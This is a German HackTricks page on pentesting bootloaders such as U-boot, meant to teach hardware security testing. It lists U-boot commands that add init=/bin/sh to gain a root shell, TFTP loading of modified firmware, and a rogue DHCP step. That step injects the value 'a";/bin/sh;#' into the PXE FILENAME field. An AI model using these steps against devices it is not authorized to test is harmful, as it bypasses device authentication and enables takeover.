{% hint style="success" %}
Lerne & übe AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lerne & übe GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Überprüfe die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teile Hacking-Tricks, indem du PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.

</details>
{% endhint %}
{% endhint %}

Die folgenden Schritte werden empfohlen, um die Startkonfigurationen und Bootloader wie U-boot zu ändern:

1. **Zugriff auf die Interpreter-Shell des Bootloaders**:
- Drücke während des Bootvorgangs "0", Leertaste oder andere identifizierte "magische Codes", um auf die Interpreter-Shell des Bootloaders zuzugreifen.

2. **Boot-Argumente ändern**:
- Führe die folgenden Befehle aus, um '`init=/bin/sh`' zu den Boot-Argumenten hinzuzufügen, was die Ausführung eines Shell-Befehls ermöglicht:
%%%
#printenv
#setenv bootargs=console=ttyS0,115200 mem=63M root=/dev/mtdblock3 mtdparts=sflash:<partitiionInfo> rootfstype=<fstype> hasEeprom=0 5srst=0 init=/bin/sh
#saveenv
#boot
%%%

3. **TFTP-Server einrichten**:
- Konfiguriere einen TFTP-Server, um Bilder über ein lokales Netzwerk zu laden:
%%%
#setenv ipaddr 192.168.2.2 #lokale IP des Geräts
#setenv serverip 192.168.2.1 #TFTP-Server-IP
#saveenv
#reset
#ping 192.168.2.1 #Netzwerkzugang überprüfen
#tftp ${loadaddr} uImage-3.6.35 #loadaddr nimmt die Adresse, um die Datei zu laden, und den Dateinamen des Bildes auf dem TFTP-Server
%%%

4. **`ubootwrite.py` verwenden**:
- Verwende `ubootwrite.py`, um das U-boot-Bild zu schreiben und eine modifizierte Firmware zu pushen, um Root-Zugriff zu erhalten.

5. **Debug-Funktionen überprüfen**:
- Überprüfe, ob Debug-Funktionen wie ausführliches Logging, Laden beliebiger Kernel oder Booten von nicht vertrauenswürdigen Quellen aktiviert sind.

6. **Vorsicht bei Hardware-Interferenzen**:
- Sei vorsichtig, wenn du einen Pin mit Masse verbindest und mit SPI- oder NAND-Flash-Chips während des Bootvorgangs des Geräts interagierst, insbesondere bevor der Kernel dekomprimiert. Konsultiere das Datenblatt des NAND-Flash-Chips, bevor du Pins kurzschließt.

7. **Rogue DHCP-Server konfigurieren**:
- Richte einen Rogue DHCP-Server mit bösartigen Parametern ein, die ein Gerät während eines PXE-Boots aufnehmen soll. Verwende Tools wie Metasploit's (MSF) DHCP-Hilfsserver. Ändere den 'FILENAME'-Parameter mit Befehlsinjektionsbefehlen wie `'a";/bin/sh;#'`, um die Eingabevalidierung für die Startverfahren des Geräts zu testen.

**Hinweis**: Die Schritte, die physische Interaktionen mit den Pins des Geräts beinhalten (*mit Sternchen markiert), sollten mit äußerster Vorsicht angegangen werden, um Schäden am Gerät zu vermeiden.


## Referenzen
* [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)

{% hint style="success" %}
Lerne & übe AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lerne & übe GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Überprüfe die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teile Hacking-Tricks, indem du PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.

</details>
{% endhint %}
</details>
{% endhint %}
